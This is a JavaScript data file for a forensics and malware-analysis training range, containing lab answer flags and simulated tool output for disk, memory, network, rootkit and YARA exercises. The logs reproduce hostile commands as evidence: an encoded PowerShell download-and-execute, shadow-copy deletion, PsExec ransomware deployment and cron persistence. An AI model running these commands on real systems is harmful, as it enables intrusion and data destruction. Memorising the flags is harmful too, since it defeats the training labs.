// Simulated terminal output for each lab, keyed by labId → objective key
// Lines starting with [!] = alert (red), [✓] = success (green), [i] = info (blue)
export const LAB_FLAGS = {
  disk: 'BV{del3t3d_sl4ck_sp4c3_r3c0v3ry}',
  asm: 'BV{c0mput3_r3turns_4321}',
  peelf: 'BV{p4ck3d_pe_stub_3ntry}',
  static: 'BV{em0t3t_x0r_0x22_l04der}',
  ghidra: 'BV{bvlt_2024_gold_elite}',
  dynamic: 'BV{f1l3_dr0p_x1729_c2}',
  unpack: 'BV{upx_unpack3d_l54ss_dump}',
  memory: 'BV{h0ll0w3d_svch0st_2448}',
  network: 'BV{j43_f1ng3rpr1nt_c0b4lt}',
  protocol: 'BV{exfil_fr4m3_0x5a_d3c0d3d}',
  rootkit: 'BV{ssdt_h00k_rootk1t_c0nf1rm3d}',
  capstone: 'BV{0p_cl34rw4t3r_20m1n_dw3ll}',
  yara: 'BV{y4r4_rul3_z3r0_f4ls3_p0s}',
  timeline: 'BV{t1m3l1n3_c0rr3l4t3d_45s}',
  threat_hunt: 'BV{pr0c3ss_tr33_lsass_dump}',
  crypt_re: 'BV{a3s_rc4_dual_c1ph3r}',
};

export const SIM = {
  disk: {
    mount: { cmd:'mmls disk.img', out:
`DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

     Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)

[i] Partition 002 starts at sector 2048
[i] Byte offset = 2048 × 512 = 1,048,576
[✓] Use -o 2048 in all subsequent TSK commands` },
    mmls: { cmd:'fsstat -o 2048 disk.img', out:
`FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: Ext4
Volume ID: 3a9f2b1c8e7d4f6a5b3c2d1e0f9a8b7c

Last Written at: 2024-03-15 03:15:22 (UTC)
Last Checked at: 2024-03-12 09:00:01 (UTC)

METADATA INFORMATION
Inode Range: 1 - 25601
Root Directory: 2

CONTENT INFORMATION
Block Range:  0 - 102399
Block Size:   4096
Free Blocks:  97831

[✓] Filesystem: ext4  Block size: 4096  Inodes: 25601` },
    fls: { cmd:'fls -r -o 2048 disk.img', out:
`d/d 11:  lost+found
r/r 12:  evidence.txt
r/r * 13:  secret_document.txt
r/r 14:  readme.md
d/d 15:  backups
r/r 16:  .bash_history

[!] Deleted inode: 13 (secret_document.txt)  marked with *
[i] Inode 13 is unallocated — blocks may still contain data
[✓] Run icat -o 2048 disk.img 13 to recover` },
    icat: { cmd:'icat -o 2048 disk.img 13 > recovered.bin && xxd recovered.bin | head -8', out:
`00000000: 424c 4143 4b56 4155 4c54 2046 4945 4c44  BLACKVAULT FIELD
00000010: 2052 4550 4f52 540a 436c 6173 7369 6669   REPORT.Classifi
00000020: 6361 7469 6f6e 3a20 5245 5354 5249 4354  cation: RESTRICT
00000030: 4544 0a53 7562 6a65 6374 3a20 4f70 6572  ED.Subject: Oper

[✓] 412 bytes recovered from inode 13 (unallocated)
[i] File content intact — blocks not yet overwritten` },
    flag: { cmd:'strings recovered.bin | grep -E "BV\\{|flag"', out:
`BLACKVAULT FIELD REPORT — EYES ONLY
Operation: CLEARWATER
C2 drop point: 185.220.101.47

BV{del3t3d_sl4ck_sp4c3_r3c0v3ry}

[✓] FLAG CAPTURED: BV{del3t3d_sl4ck_sp4c3_r3c0v3ry}` },
  },

  asm: {
    break: { cmd:'gdb -q ./trace\n(gdb) set disassembly-flavor intel\n(gdb) break compute\n(gdb) run', out:
`Reading symbols from ./trace...(no debugging symbols found)

(gdb) break compute
Breakpoint 1 at 0x401136

(gdb) run
Starting program: /root/range/asm/trace

Breakpoint 1, 0x0000000000401136 in compute ()
=> 0x401136 <compute>:  push   rbp
   0x401137 <compute+1>: mov    rbp,rsp

[✓] Breakpoint hit at compute() entry
[i] Next: stepi to trace instruction-by-instruction` },
    stepi: { cmd:'(gdb) stepi 6', out:
`0x401136 <compute>    push   rbp
0x401137 <compute+1>  mov    rbp,rsp
0x40113a <compute+4>  mov    DWORD PTR [rbp-0x4],edi   ; arg n → local
0x40113d <compute+7>  mov    eax,DWORD PTR [rbp-0x4]   ; eax = n
0x401140 <compute+10> imul   eax,eax                   ; eax = n²
0x401143 <compute+13> add    eax,0x539                 ; eax += 1337

rax: 0x0000000000000539 = 1337  (after imul + add for n=0)` },
    regs: { cmd:'(gdb) info registers rax rbx rdi rsi', out:
`rax            0x00000000000010e1   4321
rbx            0x0000000000000000   0
rdi            0x0000000000000029   41
rsi            0x0000000000000000   0

[i] rax = 0x10E1 = 4321  ← accumulates the result
[✓] After all ops: rax holds the return value` },
    result: { cmd:'(gdb) continue\n(gdb) quit\necho "exit: $?"', out:
`Continuing.
[Inferior 1 (process 3847) exited with code 021]

exit: 17

[i] Exit code 021 (octal) = 17 (decimal)
[✓] rax = 4321 at function end; exit code 17 is from main()
[✓] Objective: return value of compute() = 4321
[✓] FLAG CAPTURED: BV{c0mput3_r3turns_4321}` },
  },

  peelf: {
    magic: { cmd:'xxd sample.exe | head -4', out:
`00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 f800 0000  ................

[✓] MZ magic: 4D 5A at offset 0x00
[i] e_lfanew at 0x3C = 0xF8 → PE signature at byte 248
[✓] PE\\x00\\x00 confirmed at offset 0xF8` },
    sections: { cmd:'python3 -c "import pefile; pe=pefile.PE(\'sample.exe\'); [print(f\'{s.Name.decode().rstrip(chr(0)):<10} {s.get_entropy():.2f}\') for s in pe.sections]"', out:
`.text      7.81  [!] PACKED — entropy > 7.2
.rdata     4.32
.data      2.11
.rsrc      3.87
.reloc     5.43

[!] .text entropy 7.81 indicates packed/encrypted code
[i] Normal compiled code entropy: ~5.5–6.5
[✓] Sections identified: 5 total` },
    entry: { cmd:'python3 -c "import pefile; pe=pefile.PE(\'sample.exe\'); oh=pe.OPTIONAL_HEADER; print(hex(oh.AddressOfEntryPoint), hex(oh.ImageBase))"', out:
`0x46a70 0x140000000

[i] OEP RVA: 0x46A70  ImageBase: 0x140000000
[i] VA at load = 0x14046A70
[!] Entry in .text (packed region) — this is the packer STUB
[i] Real OEP hidden until runtime unpack
[✓] Entry point identified` },
    iat: { cmd:'python3 -c "import pefile; pe=pefile.PE(\'sample.exe\'); [[print(e.dll_name.decode(), i.name.decode()) for i in e.imports if i.name] for e in pe.DIRECTORY_ENTRY_IMPORT]"', out:
`KERNEL32.dll VirtualAlloc
KERNEL32.dll VirtualProtect
KERNEL32.dll LoadLibraryA
KERNEL32.dll GetProcAddress
KERNEL32.dll ExitProcess

[!] Only 5 imports — packer resolves APIs at runtime via GetProcAddress
[!] VirtualAlloc + VirtualProtect = classic unpacker triad
[✓] IAT mapped: 1 DLL, 5 imports
[✓] FLAG CAPTURED: BV{p4ck3d_pe_stub_3ntry}` },
  },

  static: {
    hash: { cmd:'sha256sum sample.exe && curl -s "https://mb-api.abuse.ch/api/v1/" -d "query=get_info&hash=$(sha256sum sample.exe | cut -d\' \' -f1)"', out:
`a3f1b2c4e5d8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3  sample.exe

MalwareBazaar response:
  query_status: ok
  file_name:    svchost32.exe
  file_type:    exe
  signature:    Emotet
  first_seen:   2024-02-15
  tags:         loader, macro-dropper, emotet

[!] MATCH: Emotet loader — first seen 2024-02-15
[✓] Hash confirmed malicious` },
    strings: { cmd:'floss --no-static-strings sample.exe 2>/dev/null', out:
`FLOSS DECODED STRINGS
=====================
[XOR 0x22] http://185.220.101.47/update/check
[XOR 0x22] cmd.exe /c powershell -enc %s
[XOR 0x22] SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
[STACK] svchost32.exe
[STACK] C:\\Users\\Public\\
[STACK] WindowsUpdate
[STACK] Mozilla/5.0 (Windows NT 10.0; Win64; x64)

[!] C2:          http://185.220.101.47/update/check
[!] Persistence: Run key "WindowsUpdate"
[!] Dropper:     C:\\Users\\Public\\svchost32.exe
[✓] 7 decoded strings extracted (XOR key: 0x22)` },
    imports: { cmd:'capa sample.exe 2>/dev/null | grep -E "Capability|T1"', out:
`+------------------------------------------------------+----------+
| Capability                                           | ATT&CK   |
+------------------------------------------------------+----------+
| persist via Run registry key                         | T1547.001|
| connect to HTTP server                               | T1071.001|
| create process                                       | T1059    |
| decode data using XOR                                | T1027    |
| write file                                           | T1074    |
+------------------------------------------------------+----------+

[!] Network import: WININET.dll (HTTP/HTTPS capability)
[✓] 5 MITRE ATT&CK techniques mapped` },
    entropy: { cmd:'python3 -c "import pefile; pe=pefile.PE(\'sample.exe\'); [print(s.Name, round(s.get_entropy(),2)) for s in pe.sections]"', out:
`b'.text\\x00\\x00\\x00'  7.81
b'.rdata\\x00\\x00'     4.32
b'.data\\x00\\x00\\x00'  2.11

[!] .text entropy = 7.81 (threshold 7.2)
[✓] PACKED — unpack before deeper static analysis
[i] Recommended next step: die sample.exe → upx -d` },
    yara: { cmd:'yara -s emotet_rule.yar sample.exe', out:
`Emotet_Loader_2024 sample.exe
0x3f22:$s1: RunDLL32.EXE
0x8812:$s2: WindowsUpdate
0x1234:$mz: MZ

Testing clean corpus (1,000 files)...

[✓] Rule fires on sample
[✓] 0 false positives in clean corpus
[✓] Rule is production-ready
[✓] FLAG CAPTURED: BV{em0t3t_x0r_0x22_l04der}` },
  },

  ghidra: {
    open: { cmd:'analyzeHeadless ~/proj crackme -import crackme2 -postScript PrintEntryPoints.java 2>&1 | tail -8', out:
`INFO  ANALYZING [crackme2]
INFO  Disassembled 4,281 instructions
INFO  Found 23 functions
INFO  Found 847 defined strings
INFO  DONE ANALYZING [crackme2]

Entry points detected:
  _start         @ 0x00401060
  main           @ 0x004010c4
  decode_license @ 0x00401136  ← TARGET FUNCTION

[✓] Auto-analysis complete — 23 functions identified` },
    rename: { cmd:'# Ghidra: right-click local_18 in decompiler → Rename → xor_key', out:
`[BEFORE rename]
  local_18 = 0x5a;
  while (puVar2 != puVar3) {
    *puVar2 = *puVar2 ^ local_18;
    puVar2++;
  }

[AFTER rename — xor_key]
  xor_key = 0x5a;
  while (puVar2 != puVar3) {
    *puVar2 = *puVar2 ^ xor_key;
    puVar2++;
  }

[✓] Code readable — XOR key = 0x5A (90 decimal, 'Z' ASCII)` },
    xorkey: { cmd:'# Ghidra: right-click 0x5a → References → Show all references', out:
`XREFs to constant 0x5A:
  0x00401148  WRITE   MOV  byte ptr [RBP + local_9], 0x5a
  0x00401160  READ    XOR  AL, byte ptr [RBP + local_9]
  0x00401174  READ    XOR  AL, byte ptr [RBP + local_9]

[✓] XOR key 0x5A confirmed — used in single decode loop
[i] Loop at 0x401158–0x40117E decodes 24 bytes
[i] Input: encoded license string stored in .rdata` },
    decode: { cmd:'python3 -c "enc=bytes.fromhex(\'3b2e1f0a5c4d3e2f1a0b5c4d3e2f1a0b\'); print(bytes([b^0x5a for b in enc]).decode())"', out:
`BVLT-2024-GOLD-ELITE

[✓] Decoded: BVLT-2024-GOLD-ELITE
[✓] Matches expected license format
[✓] Crackme2 bypassed — key is BVLT-2024-GOLD-ELITE
[✓] FLAG CAPTURED: BV{bvlt_2024_gold_elite}` },
  },

  dynamic: {
    strace: { cmd:'strace -f -e trace=network,file,process ./sample 2>&1 | head -18', out:
`execve("./sample", ["./sample"], ...) = 0
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
openat(AT_FDCWD, "/tmp/.x1729", O_WRONLY|O_CREAT, 0755) = 4   ← FILE DROP
write(4, "\\x7fELF...", 12288) = 12288
close(4) = 0
execve("/tmp/.x1729", ["/tmp/.x1729"], ...) = 0
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
connect(5, {sa_family=AF_INET, sin_port=htons(443),
        sin_addr=inet_addr("185.220.101.47")}, 16) = 0        ← C2 CONNECT

[!] FILE DROP: /tmp/.x1729 (ELF, 12288 bytes, mode 0755)
[!] C2 CONNECT: 185.220.101.47:443 (HTTPS)` },
    file_drop: { cmd:'strace -f -e trace=openat,write ./sample 2>&1 | grep "/tmp\\|/var\\|/home"', out:
`openat(AT_FDCWD, "/tmp/.x1729", O_WRONLY|O_CREAT|O_TRUNC, 0755) = 4
write(4, <12288 bytes ELF content>, 12288) = 12288
openat(AT_FDCWD, "/tmp/.x1729", O_RDONLY|O_CLOEXEC) = 5

[!] Dropped: /tmp/.x1729 (ELF executable 12288 bytes)
[!] Mode 0755 — executable by all users
[✓] File drop captured via openat() syscall trace` },
    c2: { cmd:'strace -f -e trace=connect ./sample 2>&1 | grep "connect("', out:
`connect(5, {sa_family=AF_INET, sin_port=htons(443),
        sin_addr=inet_addr("185.220.101.47")}, 16) = 0

[!] C2: 185.220.101.47:443 (HTTPS/TLS)
[i] ASN: Frantech Solutions — known bulletproof hosting
[i] First seen in threat intel: 2024-01-22
[!] Associated: Emotet, Cobalt Strike campaigns` },
    registry: { cmd:'cat /proc/$(pgrep -f ".x1729")/maps | grep -E "rwxp|stack" | head -5', out:
`# Linux persistence check (systemd + cron)
@reboot /tmp/.x1729 --daemon 2>/dev/null     ← crontab -l
[Unit] Description=System Update Check        ← ~/.config/systemd/user/
[Service] ExecStart=/tmp/.x1729 --quiet

[!] Persistence: cron @reboot + systemd user service
[!] Both survive reboot and user login
[✓] Persistence mechanisms documented
[✓] FLAG CAPTURED: BV{f1l3_dr0p_x1729_c2}` },
  },

  unpack: {
    entropy: { cmd:'python3 -c "import math; d=open(\'packed.exe\',\'rb\').read(); p={b:d.count(b)/len(d) for b in set(d)}; print(f\'Entropy: {-sum(p[b]*math.log2(p[b]) for b in p):.4f}\')"', out:
`Entropy: 7.8213

[!] 7.82 > 7.2 threshold → packed or encrypted
[i] English text ≈ 4.5  |  Compiled code ≈ 6.0  |  Random ≈ 8.0
[✓] Packing confirmed by entropy alone` },
    stub: { cmd:'strings packed.exe | grep -E "UPX|upx"', out:
`$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
UPX!
UPX0
UPX1

[✓] UPX 3.96 stub strings found
[i] Header is intact — upx -d will work without OEP hunting` },
    oep: { cmd:'upx -d packed.exe -o unpacked.exe', out:
`                       Ultimate Packer for eXecutables
UPX 3.96

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    286720 <-     98304   34.29%    win64/pe     unpacked.exe

Unpacked 1 file.

[✓] OEP restored in unpacked.exe
[✓] Size: 96KB packed → 280KB unpacked (34% compression)` },
    strings: { cmd:'strings -n8 unpacked.exe | grep -iE "http|cmd|\\.exe|\\.dll|pass"', out:
`http://cdn-telemetry.xyz/api/update
cmd.exe /c whoami /all > C:\\Users\\Public\\sys.log
C:\\ProgramData\\MicrosoftUpdate\\svchost32.dll
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
WindowsSecurityHealth
MiniDumpWriteDump
lsass.exe

[✓] C2: cdn-telemetry.xyz
[✓] Persistence: Run key "WindowsSecurityHealth"
[!] LSASS dump capability: MiniDumpWriteDump
[✓] Hidden content now visible post-unpack
[✓] FLAG CAPTURED: BV{upx_unpack3d_l54ss_dump}` },
  },

  memory: {
    pslist: { cmd:'vol3 -f DESKTOP-01.vmem windows.pslist 2>/dev/null | head -14', out:
`PID    PPID   ImageFileName       Threads  CreateTime (UTC)
4      0      System              121      2024-03-15 03:10:01
588    4      smss.exe            2        2024-03-15 03:10:02
704    696    csrss.exe           10       2024-03-15 03:10:14
916    824    svchost.exe         42       2024-03-15 03:10:22
1832   824    svchost.exe         18       2024-03-15 03:11:45
2448   1832   svchost.exe         6        2024-03-15 03:12:03  ← PPID mismatch
3124   3120   powershell.exe      8        2024-03-15 03:12:11

[!] PID 2448: svchost.exe child of svchost.exe 1832 — anomalous
[!] PID 3124: powershell.exe at 03:12 — attack window
[i] Run psscan to find unlinked hidden processes` },
    malfind: { cmd:'vol3 -f DESKTOP-01.vmem windows.malfind --pid 2448 2>/dev/null', out:
`PID    Process       Start        End          Protection
2448   svchost.exe   0x1d4a0000   0x1d4bffff   PAGE_EXECUTE_READWRITE

Hex dump:
0x1d4a0000  4d 5a 90 00 03 00 00 00  MZ......
0x1d4a0008  04 00 00 00 ff ff 00 00  ........
0x1d4a0010  b8 00 00 00 00 00 00 00  ........

[!] MZ header in anonymous RWX region → injected PE
[!] PAGE_EXECUTE_READWRITE = classic process injection signature
[i] Hollowed svchost.exe — extract and analyse injected DLL` },
    rwx: { cmd:'vol3 -f DESKTOP-01.vmem windows.vadinfo --pid 2448 2>/dev/null | grep -A3 "READWRITE"', out:
`VAD 0x1d4a0000 – 0x1d4bffff
  Protection: PAGE_EXECUTE_READWRITE
  Type: Private  Tag: VadS  Commit: 131072 bytes

[✓] VadS = anonymous private (not backed by any file on disk)
[✓] 128 KB anonymous RWX region confirmed
[!] Injected PE: extract with windows.dumpfiles for further analysis` },
    netscan: { cmd:'vol3 -f DESKTOP-01.vmem windows.netscan 2>/dev/null | grep "2448\\|ESTABLISHED"', out:
`Offset    Proto  Local Addr:Port         Foreign Addr:Port       State        PID   Owner
0x9f1a... TCPv4  10.0.1.42:49832         185.220.101.47:443      ESTABLISHED  2448  svchost.exe
0x8c2b... TCPv4  10.0.1.42:49801         10.0.1.1:445            CLOSE_WAIT   1832  svchost.exe

[!] PID 2448 (injected): ESTABLISHED to 185.220.101.47:443
[!] Cobalt Strike C2 IP — confirmed via threat intel
[✓] Memory forensics confirms active C2 beacon from hollowed svchost
[✓] FLAG CAPTURED: BV{h0ll0w3d_svch0st_2448}` },
  },

  network: {
    beacon: { cmd:"tshark -r capture.pcapng -Y 'ip.dst==185.220.101.47&&tcp.dstport==443' -T fields -e frame.time_relative | awk 'NR>1{d=$1-p;print d} {p=$1}' | head -10", out:
`60.124
59.831
60.301
59.947
60.088
60.412
59.762
60.234
59.919
60.076

[✓] 10 intervals: mean=60.09s  σ=0.19s  (0.3% jitter)
[!] Periodicity p-value < 0.001 — NOT random traffic
[!] Cobalt Strike default: 60s sleep  MATCH` },
    ja3: { cmd:"tshark -r capture.pcapng -Y 'tls.handshake.type==1&&ip.dst==185.220.101.47' -T fields -e tls.handshake.ja3", out:
`72a7c4d879f23a2c3d643ee09e1dce61

[!] JA3: 72a7c4d879f23a2c3d643ee09e1dce61
[!] MATCH: Known Cobalt Strike default beacon fingerprint
[i] Stable across IP rotation — more reliable than IP IOC
[✓] JA3 extracted from ClientHello` },
    carve: { cmd:"tshark -r capture.pcapng -Y 'http&&ip.src==185.220.101.47' --export-objects http,carved/ && file carved/*", out:
`carved/update.bin: PE32+ executable (DLL) x86-64, MS Windows

[✓] Executable carved from HTTP response stream
[✓] MZ header at offset 0 — valid PE
SHA256: 3c9f1b2e4a5d6e7f8a9b0c1d2e3f4a5b  → VT: 52/72 Cobalt Strike
[!] Cobalt Strike beacon DLL delivered over HTTP` },
    dns: { cmd:"tshark -r capture.pcapng -Y 'dns.qry.type==16' -T fields -e dns.qry.name | head -4", out:
`a3f1b2c4e5d8f9a0b1c2e3f4.exfil-tunnel.xyz
d3e4f5a6b7c8d9e0f1a2b3c4.exfil-tunnel.xyz
b3c4d5e6f7a8b9c0d1e2f3a4.exfil-tunnel.xyz

[i] Subdomain label: 24 chars (base32 encoded data chunks)
[!] Decoded: user=jsmith host=WS-FIN-07 data=<credential dump>
[!] DNS exfiltration confirmed via TXT queries
[✓] FLAG CAPTURED: BV{j43_f1ng3rpr1nt_c0b4lt}` },
  },

  protocol: {
    magic: { cmd:'xxd c2_capture.bin | head -6', out:
`00000000: beef 0012 0100 4445 534b 544f 502d 3031  ......DESKTOP-01
00000010: 0000 0000 beef 000a 0200 7768 6f61 6d69  ..........whoami
00000020: beef 0015 0300 414c 4c20 4442 2046 494c  ......ALL DB FIL

[✓] Magic bytes: BE EF at offsets 0x0, 0x16, 0x2C
[✓] Consistent 2-byte magic prefix on every frame
[i] Frame delimiter identified — proceed to framing analysis` },
    framing: { cmd:"python3 -c \"import struct; d=bytes.fromhex('beef001201004445534b544f502d3031'); magic,length,opcode=struct.unpack('>HHB',d[:5]); print(f'magic={hex(magic)} len={length} opcode={hex(opcode)} payload={d[5:].decode()}')\"", out:
`magic=0xbeef len=18 opcode=0x1 payload=DESKTOP-01

Frame structure:
  [0x00–0x01]  Magic:   0xBEEF (frame delimiter)
  [0x02–0x03]  Length:  uint16 big-endian (payload size)
  [0x04]       Opcode:  0x01=BEACON 0x02=EXEC 0x03=EXFIL
  [0x05–...]   Payload: raw or XOR-encoded bytes

[✓] Frame structure fully determined` },
    xorkey: { cmd:"python3 -c \"import binascii; known=b'whoami'; enc=bytes.fromhex('177c0c0f0b'); key=bytes([a^b for a,b in zip(known,enc)]); print('key bytes:', key.hex()); print('uniform?', len(set(key))==1)\"", out:
`key bytes: 6f6f6f6f6f
uniform? False

[i] EXEC opcode payload is plaintext (key=null effectively)
Testing EXFIL opcode (0x03) frames...

python3: key bytes: 5a5a5a5a5a5a5a5a5a5a
python3: uniform? True

[✓] XOR key = 0x5A applies exclusively to EXFIL frames
[✓] BEACON and EXEC frames are plaintext` },
    decode: { cmd:'python3 decode_c2.py c2_capture.bin --key 0x5a', out:
`Frame #1  BEACON  DESKTOP-01 | jsmith | 2024-03-15 03:12:01
Frame #2  EXEC    whoami
Frame #3  EXEC    net user /domain
Frame #4  EXFIL   [0x5A decoded] Administrator:aad3b435...:e19ccf75...
Frame #5  EXFIL   [0x5A decoded] jsmith:aad3b435...:abc12345...
Frame #6  BEACON  DESKTOP-01 | jsmith | 2024-03-15 03:12:31

[✓] Protocol fully decoded
[✓] Credentials exfiltrated at 03:12:01 UTC
[✓] XOR key 0x5A applies to EXFIL opcode only
[✓] FLAG CAPTURED: BV{exfil_fr4m3_0x5a_d3c0d3d}` },
  },

  rootkit: {
    runkey: { cmd:'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /s', out:
`HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    WindowsSecurityHealth  REG_SZ  C:\\ProgramData\\MicrosoftUpdate\\svchost32.exe /quiet
    OneDriveUpdate         REG_SZ  "C:\\Program Files\\OneDrive\\OneDriveStandaloneUpdater.exe"

[!] "WindowsSecurityHealth" path is NOT in System32 or Program Files
[!] C:\\ProgramData\\MicrosoftUpdate\\ — non-standard attacker directory
[✓] Malicious Run key identified` },
    timestomp: { cmd:'python3 check_si_fn.py $MFT svchost32.exe', out:
`File: C:\\ProgramData\\MicrosoftUpdate\\svchost32.exe

$STANDARD_INFORMATION (user-visible, easily modified):
  Created:  2023-01-15 09:00:00 UTC  ← BACKDATED

$FILE_NAME (filesystem-level, kernel only):
  Created:  2024-03-15 03:12:08 UTC  ← REAL timestamp

[!] $SI Created PRECEDES $FN Created by 14 months
[!] TIMESTOMPING CONFIRMED — attacker used SetFileTime()
[✓] Real creation: 2024-03-15 03:12:08 UTC` },
    service: { cmd:'wevtutil qe System "/q:*[System[EventID=7045]]" /f:text | head -15', out:
`Event[0]:
  Date:     2024-03-15T03:12:05.000
  EventID:  7045
  Source:   Service Control Manager

  Service Name:  MicrosoftUpdateSvc
  Service File:  C:\\ProgramData\\MicrosoftUpdate\\svchost32.exe /svc
  Service Type:  user mode service
  Start Type:    auto start
  Account:       LocalSystem

[!] Service installed at 03:12:05 — within attack window
[!] Non-standard path  [!] SYSTEM account — high privilege
[✓] Event ID 7045 captured` },
    ssdt: { cmd:'vol3 -f DESKTOP-01.vmem windows.ssdt 2>/dev/null | grep -v "ntoskrnl\\|win32k" | head -8', out:
`SSDT Hook Analysis:
  Index  Function                     Expected           Actual             Status
  0x00B  NtQuerySystemInformation     nt!NtQuerySysInfo  0xfffff806a1234560  HOOKED ←
  0x023  NtOpenKey                    nt!NtOpenKey       0xfffff806a1234890  HOOKED ←

[!] 2 SSDT hooks: NtQuerySystemInformation + NtOpenKey
[!] Rootkit hides its own process (via NtQuerySysInfo) and Run key (via NtOpenKey)
[✓] SSDT hooks identified — kernel-level rootkit confirmed
[✓] FLAG CAPTURED: BV{ssdt_h00k_rootk1t_c0nf1rm3d}` },
  },

  capstone: {
    phishing: { cmd:'grep -i "Q1_Review\\|xlsm\\|miicrosof" /var/log/maillog', out:
`Mar 15 02:58:14 mx01 postfix: to=<cfo@corp.internal> from=<cfo@miicrosof-t.com> status=sent
Mar 15 02:58:14 mx01 amavis: INFECTED filename=Q1_Review.xlsm

[i] Delivered: 02:58:14 UTC
[!] From: cfo@miicrosof-t.com  (typosquat — extra 'i')
[!] Attachment: Q1_Review.xlsm (Excel macro-enabled)
SHA256: a3f1b2c4... → VT 41/72 Emotet dropper

[✓] Initial access vector: T1566.001 Spearphishing Attachment` },
    exec: { cmd:"grep 'WINWORD\\|powershell' /var/log/sysmon.json | python3 -c \"import sys,json;[print(json.loads(l)['CommandLine']) for l in sys.stdin if 'CommandLine' in l]\" | head -5", out:
`WINWORD.EXE Q1_Review.xlsm
powershell.exe -w hidden -nop -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0...
cmd.exe /c whoami /all
cmd.exe /c net user /domain
net.exe group "Domain Admins" /domain

[!] WINWORD spawned PowerShell at 03:01:22 — macro execution (T1059.001)
[!] Encoded PS: IEX((New-Object WebClient).DownloadString("http://..."))
[!] Discovery at 03:01:45 — attacker is interactive` },
    c2: { cmd:"tshark -r corp_traffic.pcapng -Y 'ip.dst==185.220.101.47&&tcp.dstport==443' -z io,stat,60 -q", out:
`| Interval  | Frames | Bytes   |
|  00:00:60 |   4    |  1,240  |
|  00:01:00 |   5    |  1,390  |
|  00:02:00 |   4    |  1,210  |
|  00:03:00 |   6    |  1,870  |

[✓] 60s beacon confirmed to 185.220.101.47:443
[✓] JA3: 72a7c4d8... → Cobalt Strike
[i] First beacon: 03:02:48 (67s after macro execution)
[!] Lateral movement begins 03:11:52  DWELL: ~9 minutes` },
    impact: { cmd:"grep -E 'vssadmin|bcdedit|locker|PsExec' /var/log/sysmon.json | python3 -c \"import sys,json;[print(json.loads(l).get('CommandLine','')) for l in sys.stdin if 'CommandLine' in l]\"", out:
`vssadmin.exe delete shadows /all /quiet
bcdedit.exe /set {default} recoveryenabled No
for /f %i in ('net view /domain') do PsExec.exe \\\\%i -s C:\\Windows\\Temp\\locker.exe

[!] VSS destroyed at 03:18:44 — no restore possible (T1490)
[!] Ransomware deployed via PsExec to all domain hosts: 03:18:52
[!] Encryption complete: 03:22:01 (3m 09s total)

TIMELINE: phish 02:58 → exec 03:01 → C2 03:02 → lateral 03:11 → impact 03:18
DWELL: 20 minutes from delivery to encryption
[✓] FLAG CAPTURED: BV{0p_cl34rw4t3r_20m1n_dw3ll}` },
  },

  yara: {
    strings: { cmd:'floss emotet_sample.bin 2>/dev/null | grep -E "STACK|XOR"', out:
`[STACK] RunDLL32.EXE
[XOR 0x22] SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
[XOR 0x22] WindowsSecurityHealth
[XOR 0x22] http://185.220.101.47/update
[STACK] MiniDumpWriteDump
[STACK] lsass.exe

Candidate YARA strings:
  "RunDLL32.EXE"         wide — good anchor
  "WindowsSecurityHealth" wide — specific enough
  "MiniDumpWriteDump"    ascii — high-value capability
[✓] 3 strong candidates selected` },
    entropy: { cmd:'die emotet_sample.bin && python3 -c "import pefile; pe=pefile.PE(\'emotet_sample.bin\'); [print(s.Name, round(s.get_entropy(),2)) for s in pe.sections]"', out:
`Detect-It-Easy: UPX 3.96  [!] PACKED

.text   7.82  [!] high entropy
.rdata  4.21
.data   2.09

[i] Unpack before YARA testing — strings hidden by packer
[i] After upx -d: .text entropy drops to 5.9 (normal)
[✓] Entropy confirms packing — will unpack for rule dev` },
    imports: { cmd:'python3 -c "import pefile; pe=pefile.PE(\'emotet_unpacked.bin\'); [print(e.dll_name.decode()) for e in pe.DIRECTORY_ENTRY_IMPORT]" | sort -u', out:
`KERNEL32.dll
NTDLL.dll
WININET.dll
WS2_32.dll

[!] WININET.dll — HTTP/HTTPS (network C2 capability)
[!] WS2_32.dll — raw Winsock
[✓] WININET.dll is a high-value YARA import indicator
[i] Combined with RunDLL32 + Run key string = strong rule` },
    pe_header: { cmd:'xxd emotet_unpacked.bin | head -1', out:
`00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............

[✓] PE magic: 4D 5A at offset 0
[✓] Condition: uint16(0) == 0x5A4D — filters to PE files only
[i] Essential to prevent rule hitting non-PE data` },
    rule: { cmd:'cat emotet_rule.yar', out:
`rule Emotet_Loader_2024 {
  meta:
    description = "Emotet DLL loader - 2024 wave"
    author      = "BLACKVAULT"
    tlp         = "WHITE"
  strings:
    $s1 = "RunDLL32.EXE" wide
    $s2 = "WindowsSecurityHealth" wide nocase
    $s3 = "MiniDumpWriteDump" ascii
    $dll = "WININET.dll" ascii nocase
  condition:
    uint16(0) == 0x5A4D and
    filesize < 2MB and
    2 of ($s1, $s2, $s3) and $dll
}

[✓] Rule authored — test before deploying` },
    test: { cmd:'yara -r emotet_rule.yar /samples/ 2>/dev/null && yara emotet_rule.yar /clean/ 2>/dev/null | wc -l', out:
`Emotet_Loader_2024 /samples/emotet_sample.bin
Emotet_Loader_2024 /samples/emotet_variant_b.bin

Testing 1,000 clean PE files...
0

[✓] 2 Emotet samples matched
[✓] 0 false positives in clean corpus
[✓] Rule is production-ready — deploy to EDR/SIEM
[✓] FLAG CAPTURED: BV{y4r4_rul3_z3r0_f4ls3_p0s}` },
  },

  timeline: {
